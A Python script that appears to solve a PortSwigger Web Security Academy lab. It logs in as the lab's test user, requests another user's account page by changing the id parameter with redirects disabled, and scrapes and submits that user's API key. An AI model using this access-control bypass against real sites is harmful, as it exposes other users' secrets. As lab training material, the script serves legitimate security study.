import requests
from bs4 import BeautifulSoup
import re

site = "0a010029039c315e814f343b008d006c.web-security-academy.net"
s = requests.Session()

# Step 1: Login
s.post(f"https://{site}/login", data={"username": "wiener", "password": "peter"})

# Step 2: Access Carlos’s profile with redirection disabled
profile_url = f"https://{site}/my-account?id=carlos"
resp = s.get(profile_url, allow_redirects=False)
soup = BeautifulSoup(resp.text, "html.parser")

# Step 3: Extract API Key from raw <div> text
div_text = soup.find(string=re.compile(r"Your API Key is"))
if div_text:
    api_key = div_text.split(": ")[1].strip()
    print(f"[✓] Retrieved API key: {api_key}")

    # Step 4: Submit solution
    submit_url = f"https://{site}/submitSolution"
    s.post(submit_url, data={"answer": api_key})

    # Step 5: Confirm solve
    home = s.get(f"https://{site}/")
    if "Congratulations" in home.text:
        print("[✓] Lab solved and API key submitted successfully.")
    else:
        print("[!] Submission sent, but lab not marked as solved.")
else:
    print("[!] Could not find API key. Dumping HTML:")
    print(resp.text)
